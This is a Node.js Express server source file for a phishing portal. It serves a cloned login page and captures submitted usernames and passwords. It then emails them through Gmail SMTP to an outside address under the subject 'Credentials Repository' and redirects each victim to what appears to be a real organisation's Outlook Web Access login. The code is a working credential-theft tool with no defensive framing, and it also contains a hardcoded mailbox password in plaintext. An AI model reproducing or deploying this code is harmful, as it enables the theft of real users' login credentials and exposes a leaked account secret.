const express = require('express')
const bodyParser = require('body-parser')
const exphbs = require('express-handlebars')
const path = require('path');
const nodemailer = require('nodemailer')


const app = express();

//view engine setup
app.engine('handlebars',exphbs())
app.set('view engine','handlebars')

// Static folder
app.use('/public', express.static(path.join(__dirname,'public')))

// Body parser Middleware
app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())

//render cloned page
//default view in views/contact.handlebars
app.get('/',(req, res) => {
	res.render('contact')
})

//send email
//use body parser to get req details from form
app.post('/send', (req, res) => {
	console.log(req.body)
	const output = `
		<p>You have a new password entry from Phishing Portal</p>
		<h3>User Details</h3>
		<ul>
			<li>Name: ${req.body.username}</li>
			<li>Password:${req.body.password}</li>
		</ul>
	`

	// create reusable transporter object using the default SMTP transport - option to use gmail
    let transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 465,
        secure: true, // true for 465, false for other ports
        auth: {
            user: 'supporit22@gmail.com', // generated ethereal user
            pass: 'Sentinel@2019**'  // generated ethereal password
        },
        tls: {
            rejectUnauthorized: false
        }
    });

    // setup email data with unicode symbols
    let mailOptions = {
        from: 'supporit22@gmail.com', // sender address
        to: 'abdirahmanhish254@gmail.com', // list of receivers
        subject: 'Credentials Repository', // Subject line
        text: 'New Password Crendetial', // plain text body
        html: output // html body
    };

    // send mail with defined transport object
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return console.log(error);
        }
        console.log('Message sent: %s', info.messageId);
        // Preview only available when sending through an Ethereal account
        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));

        res.redirect('https://mail.kenyare.co.ke/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail.kenyare.co.ke%2fowa%2f') //original page url
    });
})

var port = process.env.PORT || 8000

app.listen(port, function() {
    console.log("App is running on port " + port);
});